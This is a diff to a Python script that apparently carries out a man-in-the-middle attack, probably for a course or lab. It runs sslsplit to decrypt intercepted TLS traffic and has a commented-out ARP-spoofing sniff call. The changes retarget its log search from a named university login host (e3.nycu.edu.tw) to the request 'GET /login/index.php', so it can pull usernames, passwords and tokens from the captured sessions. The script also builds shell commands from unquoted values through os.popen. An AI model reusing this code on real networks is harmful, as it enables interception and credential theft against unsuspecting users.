@@ -15,6 +15,7 @@ my_IP = ""
 log_dir = "./sslsplit_log"
 connect_log = 'connect.log'
 SIOCGIFADDR = 0x8915
+capture_info = 'GET /login/index.php'
 
 def get_my_MAC():
     global my_MAC, interface_name
@@ -72,12 +73,11 @@ def process_packets():
 
 def find_log_file():
     # get the latest connect
-    find_log = os.popen(f"grep -s 'sni:e3.nycu.edu.tw' connect.log | tail -n 1").read().split() # -s: not print error
+    find_log = os.popen(f"grep -s {capture_info} {log_dir}/* | tail -n 1").read().split() # -s: not print error
     if(len(find_log) > 0):
-        find_name = f'{find_log[4]},{find_log[5]}' # ip,port
-        log_name = os.popen(f'ls {log_dir} | grep -s {find_name}').read().strip()
-        if(log_name):
-            return f'{log_dir}/{log_name}'
+        for log_path in find_log:
+            if(log_path.find('.log')!=-1):
+                return log_path
     return 0
 
 #usr, pw, tok = 'username=', '&password=', '&token'
@@ -122,6 +122,5 @@ while True:
     with open("sslsplit.pid") as pid_file:
         pid = next(pid_file).strip()
         os.kill(int(pid), signal.SIGTERM)
-
 
 # sniff(filter="arp", prn=ARP_spoofing, store=0)
